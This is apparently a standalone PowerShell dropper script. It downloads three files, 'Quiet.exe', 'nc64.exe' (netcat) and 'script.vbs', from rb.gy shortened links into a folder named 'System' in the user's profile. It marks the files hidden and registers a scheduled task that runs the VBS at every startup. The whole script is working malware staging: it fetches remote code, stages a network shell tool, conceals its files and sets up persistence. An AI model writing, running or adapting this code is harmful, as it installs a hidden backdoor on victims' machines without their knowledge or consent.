# Set up variables
$installPath = Join-Path $env:USERPROFILE "System"
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"
$scriptVbsUrl = "https://rb.gy/3lld2p"

# File paths for the downloaded files
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# Create the 'System' folder in the user's profile if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# Download the files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -ErrorAction Stop
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -ErrorAction Stop
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop

# Make the downloaded files hidden
attrib +H $quietTxtPath
attrib +H $nc64TxtPath
attrib +H $scriptVbsPath

# Define the action to run script.vbs using wscript.exe
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $scriptVbsPath

# Define the trigger to run at startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Create the scheduled task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

try {
    # Register the task for the current user without specifying Principal
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "RunScriptVBSAtStartup" -Settings $settings -User $env:USERNAME -Force
    Write-Output "Scheduled task 'RunScriptVBSAtStartup' has been created and will run at startup."
} catch {
    Write-Output "Failed to create the scheduled task: $_"
}
